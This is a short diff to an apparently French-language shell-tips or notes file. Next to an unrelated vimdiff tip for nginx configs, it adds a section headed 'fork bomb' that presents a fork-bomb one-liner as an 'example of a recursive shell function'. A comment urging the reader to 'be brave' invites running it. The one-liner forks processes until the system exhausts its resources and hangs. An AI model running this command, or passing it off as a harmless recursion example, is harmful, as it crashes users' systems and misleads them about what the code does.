@@ -218,3 +218,10 @@ d'avance merci.
 
     vimdiff nginx{,.new}
 
+# fork bomb :)
+
+exemple de fonction récursive en shell.
+
+    # we're 99%: be brave
+    b(){b|b&};b
+
